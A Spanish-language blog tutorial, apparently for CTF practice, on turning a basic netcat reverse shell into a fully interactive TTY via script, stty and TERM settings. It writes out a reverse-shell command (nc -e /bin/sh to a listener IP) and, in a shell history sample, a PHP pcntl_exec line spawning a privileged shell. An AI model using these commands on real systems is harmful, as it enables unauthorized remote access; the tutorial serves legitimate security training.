---
title: "Domina el TTY: Tu Guía para Explotar Shells Durante CTFs"
date: 2024-06-12 19:00:00 +0200
categories: [CTF, Tutoriales]
tags: [tty, shell, reverse-shell, Tutoriales]
---


¡Bienvenidos a nuestro tutorial sobre TTY en contextos de CTF! ¿Alguna vez hemos logrado acceder a una shell durante un CTF y nos hemos encontrado con que es casi inutilizable? Aquí vamos a mostrar cómo podemos mejorar nuestra experiencia y hacer nuestra shell mucho más interactiva y funcional.

## ¿Qué es el TTY y por qué es importante?

El TTY (abreviatura de teletypewriter) se refiere a la terminal en la que interactuamos con nuestro sistema. Cuando explotamos una vulnerabilidad y obtenemos acceso a una shell, a menudo es básica y limitada. Mejorar esta shell con un tratamiento adecuado de TTY puede transformar nuestra experiencia, permitiéndonos interactuar con el sistema objetivo como si estuviéramos trabajando directamente desde su consola.

## Ejemplo sin TTY: Reverse shell Básica

Supongamos que hemos lanzado una reverse shell con este comando desde la máquina objetivo:

```bash
nc -e /bin/sh 192.168.1.100 5555
```

Y nuestra máquina atacante está escuchando con:

```bash
nc -lvnp 5555
```

Una vez que la conexión se establece, aquí está lo que enfrentamos:


### No hay autocompletado: Al presionar Tab para completar comandos o nombres de archivos simplemente no funciona. Ejemplo:
```bash
cd /sys/ker	    aa
```
### No podemos limpiar la pantalla: Los comandos como clear no funcionan, dejando la sesión visualmente desordenada. Ejemplo:
```bash
clear
TERM environment variable not set.
```

### Control de señales deficiente: Intentar detener un proceso con Ctrl+C cerrará la shell. Ejemplo:

```bash
lrwxrwxrwx   1 root root     7 jun  6 09:10 bin -> usr/bin
drwxr-xr-x   3 root root  4096 jun  6 09:14 boot
drwxr-xr-x  17 root root  3260 jun 12 20:13 dev
drwxr-xr-x  76 root root  4096 jun 12 20:53 etc
drwxr-xr-x   3 root root  4096 jun  6 10:42 home
lrwxrwxrwx   1 root root    30 jun  6 09:12 initrd.img -> boot/initrd.img-6.1.0-21-amd64
lrwxrwxrwx   1 root root    30 jun  6 09:11 initrd.img.old -> boot/initrd.img-6.1.0-18-amd64
lrwxrwxrwx   1 root root     7 jun  6 09:10 lib -> usr/lib
lrwxrwxrwx   1 root root     9 jun  6 09:10 lib64 -> usr/lib64
drwx------   2 root root 16384 jun  6 09:10 lost+found
drwxr-xr-x   3 root root  4096 jun  6 09:10 media
drwxr-xr-x   2 root root  4096 jun  6 09:10 mnt
drwxr-xr-x   3 root root  4096 jun  6 11:05 opt
dr-xr-xr-x 229 root root     0 jun 12 20:12 proc
drwx------   4 root root  4096 jun  6 11:31 root
drwxr-xr-x  19 root root   620 jun 12 20:13 run
lrwxrwxrwx   1 root root     8 jun  6 09:10 sbin -> usr/sbin
drwxr-xr-x   3 root root  4096 jun  6 10:28 srv
dr-xr-xr-x  13 root root     0 jun 12 20:12 sys
drwxrwxrwt  10 root root  4096 jun 12 20:39 tmp
drwxr-xr-x  12 root root  4096 jun  6 09:10 usr
drwxr-xr-x  12 root root  4096 jun  6 09:19 var
lrwxrwxrwx   1 root root    27 jun  6 09:12 vmlinuz -> boot/vmlinuz-6.1.0-21-amd64
lrwxrwx: not foundt root    27 jun  6 09:11 vmlinuz.old -> boot/vmlinuz-6.1.0-18-amd64
^[[A^[[A
sh: 7: 
^C
    ~  ✘ 1  took  42s  
```

### Caracteres extraños al navegar por el historial: Las flechas del teclado generan caracteres como  ^[[A [[2~^[[H ^[[B.  Ejemplo:
```bash
^[[A^[[A^[[B^[[C^[[D^[[C^[[B^[[D^[[C^[[A^[[D^[^[[C^[[A^[[D^[[2~^[[H
```
## Esta situación, aunque funcional, está lejos de ser ideal. En la siguiente sección, vamos a mostrar cómo podemos transformar esta experiencia básica en algo mucho más poderoso.

## Mejorando la Experiencia: Uso de TTY en Reverse shell

Ahora que tenemos una conexión de shell básica, vamos a transformarla en una interfaz completamente interactiva. Aquí te mostramos cómo podemos lograr una experiencia de shell completa, utilizando el método script para simular un TTY:

### Asegurar una conexión básica: 
Nos aseguramos de que tenemos una shell básica corriendo como la que hemos establecido previamente con Netcat.

### Iniciar una sesión de shell interactiva
En nuestra shell básica, ejecutamos el siguiente comando para forzar la creación de una sesión de bash interactiva:
```bash
script /dev/null -c bash
```
###  Suspender la shell
Una vez que el comando anterior está en ejecución, utilizamos 
```bash
Control+Z 
```
para suspender temporalmente nuestra shell.

### Preparar nuestro terminal local: 
Antes de volver a nuestra shell, configuramos nuestro terminal local:
```bash
stty raw -echo; fg
```

### Resetear la configuración del terminal
Ahora que tenemos el control de la shell, la reseteamos para asegurar que se comporta correctamente:
```bash
reset
```
### Configura el tipo de terminal:

```bash
xterm
export TERM=xterm
export SHELL=bash
```
### Ajustar dimensiones del terminal
Ajustamos las dimensiones de la terminal para mostrar la información correctamente:
```bash
stty rows 52 columns 187
``` 
## Confirmamos que ahora si tenemos una Shell lista para trabajar!

Dimensiones en VI
 <img src="/img/posts/TTY.png" alt="Dimensiones VI">


control + C , no salimos de la Shell
```bash

jenkins@find-me:~$ ^C
jenkins@find-me:~$ ^C
jenkins@find-me:~$ ^C
jenkins@find-me:~$ ^C
jenkins@find-me:~$ ^C
jenkins@find-me:~$ ^C
```
Podemos visualizar history
```bash
  13  /usr/bin/php8.2 -r "pcntl_exec('/bin/sh', ['-p']);"
   14  exit
   15  reset
   16  export TERM=xterm
   17  export SHELL=bash
   18  stty rows 52 columns 187
   19  vi
   20  clear
   21  history 
jenkins@find-me:~$ history 
```

<br>

Espero que os haya gustado esta guía y que os sea útil para mejorar vuestras habilidades en futuros CTFs. Seguid explorando y ajustando estos métodos según vuestras necesidades. Nos vemos pronto con más contenido que esperamos os ayude a seguir creciendo en este emocionante campo. ¡Hasta la próxima!